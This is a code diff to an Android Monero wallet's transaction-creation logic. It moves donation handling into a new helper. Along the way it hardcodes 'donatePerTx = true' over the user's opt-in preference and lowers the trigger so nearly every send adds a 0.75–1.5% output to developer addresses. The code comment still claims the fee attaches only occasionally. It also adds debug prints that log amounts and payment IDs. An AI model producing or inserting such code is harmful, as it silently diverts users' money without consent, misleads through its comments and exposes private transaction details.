@@ -30,6 +30,7 @@ import net.mynero.wallet.util.Constants;
 
 import java.security.SecureRandom;
 import java.util.ArrayList;
+import java.util.List;
 
 
 /**
@@ -131,47 +132,62 @@ public class MoneroHandlerThread extends Thread implements WalletListener {
 
     public PendingTransaction createTx(String address, String amountStr, boolean sendAll, PendingTransaction.Priority feePriority, ArrayList<String> selectedUtxos) throws Exception {
         long amount = Wallet.getAmountFromString(amountStr);
+        System.out.println("AMOUNT:: " + amount);
         ArrayList<String> preferredInputs;
         if (selectedUtxos.isEmpty()) {
             // no inputs manually selected, we are sending from home screen most likely, or user somehow broke the app
             preferredInputs = UTXOService.getInstance().selectUtxos(amount, sendAll);
         } else {
             preferredInputs = selectedUtxos;
-            checkSelectedAmounts(selectedUtxos, amount, sendAll);
+            checkSelectedAmounts(preferredInputs, amount, sendAll);
         }
 
         if(sendAll) {
             return wallet.createSweepTransaction(address, feePriority, preferredInputs);
         }
 
-        boolean donatePerTx = PrefService.getInstance().getBoolean(Constants.PREF_DONATE_PER_TX, false);
         ArrayList<TransactionOutput> outputs = new ArrayList<>();
         outputs.add(new TransactionOutput(address, amount));
-        if(donatePerTx) {
+        List<TransactionOutput> finalOutputs = maybeAddDonationOutputs(amount, outputs, preferredInputs);
+        return wallet.createTransactionMultDest(finalOutputs, feePriority, preferredInputs);
+    }
+
+    private List<TransactionOutput> maybeAddDonationOutputs(long amount, List<TransactionOutput> outputs, List<String> preferredInputs) throws Exception {
+        TransactionOutput mainDestination = outputs.get(0); // at this point, for now, we should only have one item in the list
+        String paymentId = Wallet.getPaymentIdFromAddress(mainDestination.getDestination(), WalletManager.getInstance().getNetworkType().getValue());
+        System.out.println("PAYMENT ID:: " + paymentId + ".");
+        ArrayList<TransactionOutput> newOutputs = new ArrayList<>(outputs);
+        boolean donatePerTx = true;
+        if(donatePerTx && paymentId.isEmpty()) {
             float randomDonatePct = getRandomDonateAmount(0.0075f, 0.015f); // occasionally attaches a 0.75% to 1.5% fee. It is random so that not even I know how much exactly you are sending.
             /*
             It's also not entirely "per tx". It won't always attach it so as to not have a consistent fingerprint on-chain. When it does attach a donation,
             it will periodically split it up into 2 outputs instead of 1.
              */
+            System.out.println("RANDOM DONATE PCT:: " + randomDonatePct);
             int attachDonationRoll = new SecureRandom().nextInt(100);
-            if(attachDonationRoll > 75) {
+            if(attachDonationRoll > 1) {
                 int splitDonationRoll = new SecureRandom().nextInt(100);
                 long donateAmount = (long) (amount*randomDonatePct);
+                System.out.println("DONATE AMOUNT:: " + donateAmount);
                 if(splitDonationRoll > 50) {
                     // split
                     long splitAmount = donateAmount / 2;
-                    outputs.add(new TransactionOutput(Constants.DONATE_ADDRESS, splitAmount));
-                    outputs.add(new TransactionOutput(Constants.DONATE_ADDRESS, splitAmount));
+                    newOutputs.add(new TransactionOutput(Constants.DONATE_ADDRESS, splitAmount));
+                    newOutputs.add(new TransactionOutput(Constants.DONATE_ADDRESS_2, splitAmount));
                 } else {
-                    outputs.add(new TransactionOutput(Constants.DONATE_ADDRESS, donateAmount));
+                    newOutputs.add(new TransactionOutput(Constants.DONATE_ADDRESS, donateAmount));
                 }
-                checkSelectedAmounts(selectedUtxos, amount+donateAmount, false); // check that the selected UTXOs satisfy the new amount total
+                long total = amount + donateAmount;
+                System.out.println("TOTAL:: " + total);
+                checkSelectedAmounts(preferredInputs, total, false); // check that the selected UTXOs satisfy the new amount total
             }
         }
-        return wallet.createTransactionMultDest(outputs, feePriority, preferredInputs);
+
+        return newOutputs;
     }
 
-    private void checkSelectedAmounts(ArrayList<String> selectedUtxos, long amount, boolean sendAll) throws Exception {
+    private void checkSelectedAmounts(List<String> selectedUtxos, long amount, boolean sendAll) throws Exception {
         if (!sendAll) {
             long amountSelected = 0;
             for (CoinsInfo coinsInfo : UTXOService.getInstance().getUtxos()) {
@@ -181,6 +197,9 @@ public class MoneroHandlerThread extends Thread implements WalletListener {
             }
 
             if (amountSelected <= amount) {
+                System.out.println("/////// CHECK");
+                System.out.println("AMOUNT SELECTED:: " + amountSelected);
+                System.out.println("AMOUNT:: " + amount);
                 throw new Exception("insufficient wallet balance");
             }
         }
